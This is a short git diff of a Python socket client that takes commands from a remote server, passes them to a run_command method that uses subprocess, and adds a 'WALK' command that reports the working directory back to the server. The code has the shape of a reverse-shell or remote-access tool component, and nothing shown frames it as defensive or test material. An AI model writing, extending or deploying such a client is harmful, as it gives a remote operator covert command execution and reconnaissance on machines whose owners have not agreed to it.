@@ -1,6 +1,6 @@
 import socket
 import subprocess
-from os import system
+import os
 from time import sleep
 
 HEADER = 64
@@ -41,16 +41,28 @@ class client:
             return 0
 
         msg = self.server.recv(int(size.decode()))
+        msg = msg.decode()
 
-        if msg.decode() == "TEST":
+        if msg == "TEST":
             return 1
 
-        passed = self.run_command(msg.decode())
+        elif msg == "WALK":
+            self.walk()
+
+        passed = self.run_command(msg)
         if not passed:
             return 0
 
         return 1
 
+
+    def walk(self):
+        passed = False
+
+        passed = self.send(os.getcwd())
+
+        if not passed:
+            return 0
 
     def run_command(self, cmd):
         try:
